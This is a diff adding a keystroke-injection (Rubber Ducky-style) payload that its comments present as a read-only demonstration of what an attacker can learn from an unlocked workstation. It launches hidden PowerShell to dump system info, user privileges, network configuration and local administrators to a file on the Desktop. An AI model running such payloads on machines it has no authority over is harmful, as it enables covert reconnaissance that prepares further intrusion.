@@ -1,0 +1,11 @@
+REM NAME host-enumeration
+REM Read-only host enumeration. Writes a text summary to the target's own
+REM Desktop for the operator to collect; changes nothing else. Use this to
+REM show what an attacker could learn in the seconds a workstation is left
+REM unlocked.
+DEFAULT_DELAY 40
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -NoProfile -WindowStyle Hidden -Command "$o=\"$env:USERPROFILE\Desktop\hexbee-enum.txt\"; systeminfo | Out-File $o; whoami /all | Out-File -Append $o; ipconfig /all | Out-File -Append $o; net localgroup administrators | Out-File -Append $o"
+ENTER
